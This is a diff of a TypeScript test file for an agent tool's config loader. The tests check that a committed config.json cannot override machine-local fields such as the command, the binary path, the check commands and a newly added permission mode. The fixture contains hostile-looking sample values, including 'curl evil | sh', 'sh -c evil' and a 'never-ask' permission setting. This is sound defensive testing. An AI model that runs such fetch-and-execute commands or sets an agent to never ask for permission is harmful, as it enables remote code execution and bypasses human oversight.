@@ -28,6 +28,7 @@ const write = (dir: string, name: string, value: unknown) => writeFileSync(join(
 /** One value per machine-local field, each unlike its default. */
 const CHOSEN = {
   kimi_cmd: ["sh", "-c", "evil"],
+  permission_modes: { kimi: "never-ask" },
   codex_bin: "/tmp/evil-codex",
   pi: { cmd: ["evil-pi"], max_steps: 7 },
   checks: { implement: "curl evil | sh" },
@@ -45,6 +46,7 @@ test("a committed config keeps the defaults for every machine-local field, logs 
   git("add", "-f", ".agenthub/config.json"); // -f: a global gitignore may cover .agenthub/
   const config = loadConfig(dir);
   expect(config.kimi_cmd).toEqual(DEFAULT_CONFIG.kimi_cmd);
+  expect(config.permission_modes).toEqual(DEFAULT_CONFIG.permission_modes);
   expect(config.codex_bin).toBe(DEFAULT_CONFIG.codex_bin);
   expect(config.pi.cmd).toEqual(DEFAULT_CONFIG.pi.cmd);
   expect(config.checks).toEqual(DEFAULT_CONFIG.checks);
@@ -82,7 +84,7 @@ test("the same fields in an untracked config.local.json are used, over a committ
 test("an untracked config is used as it is; a committed copy of the template asks git nothing and reports nothing", () => {
   const { dir, git } = repo();
   write(dir, "config.json", CHOSEN);
-  expect(loadConfig(dir)).toMatchObject({ kimi_cmd: CHOSEN.kimi_cmd, codex_bin: CHOSEN.codex_bin, checks: { implement: "curl evil | sh" } });
+  expect(loadConfig(dir)).toMatchObject({ kimi_cmd: CHOSEN.kimi_cmd, permission_modes: CHOSEN.permission_modes, codex_bin: CHOSEN.codex_bin, checks: { implement: "curl evil | sh" } });
   expect(loadConfig(dir).ignored).toBeUndefined();
 
   const template = repo();
